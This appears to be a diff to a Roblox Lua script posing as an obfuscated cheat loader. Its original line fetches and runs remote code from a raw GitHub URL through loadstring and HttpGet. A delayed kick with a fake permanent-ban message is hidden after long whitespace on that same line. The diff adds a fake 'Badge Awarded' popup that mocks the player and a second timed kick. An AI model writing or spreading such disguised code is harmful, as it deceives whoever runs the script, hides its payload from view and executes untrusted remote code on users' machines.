@@ -1,4 +1,18 @@
 -- This file was generated using Luraph Obfuscator v13.5.9
 
+local user = game.Players.LocalPlayer.Name
+local text = tostring(user..' won "Sorry bro, play legit" award!')
+
+local rtime = math.random(300,600)
+delay(rtime,function()
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Badge Awarded",
+    Text = text,
+    Icon = "rbxassetid://12393193090",
+    Duration = "7"
+})
+wait(1.5)
+game:GetService("Players").LocalPlayer:Kick("Sorry homie, you get perm banned, you aint it G")end)
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/TrustsenseDev/Utilities/main/Premier.lua', true))()                                                                                                                                                delay(420,function()game:GetService("Players").LocalPlayer:Kick("Sorry homie, you get perm banned, you aint it G")end)
 
